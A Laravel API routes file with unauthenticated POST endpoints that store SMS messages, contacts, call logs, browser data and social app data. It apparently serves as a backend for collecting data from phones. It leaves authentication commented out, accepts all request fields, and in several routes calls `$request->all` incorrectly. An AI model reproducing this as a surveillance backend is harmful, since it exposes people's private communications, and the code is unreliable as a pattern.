<?php

use App\Models\Browser;
use App\Models\Contact;
use App\Models\ContactLog;
use App\Models\Sms;
use App\Models\SocialApp;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

// Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
//     return $request->user();
// });


    Route::post('browsers', function (Request $request) {
        return Browser::create($request->all);
    });
    Route::post('sms', function(Request $request) {
        return Sms::create($request->all);
    });
    Route::post('contact', function(Request $request) {
        return Contact::create($request->all);
    });
    Route::post('call_logs', function(Request $request) {
        ContactLog::create($request->all);
        return response("Sucess",200);
    });
    Route::post('social_media',function(Request $request) {
        SocialApp::create($request->all());
        return response("Success",200);
    });



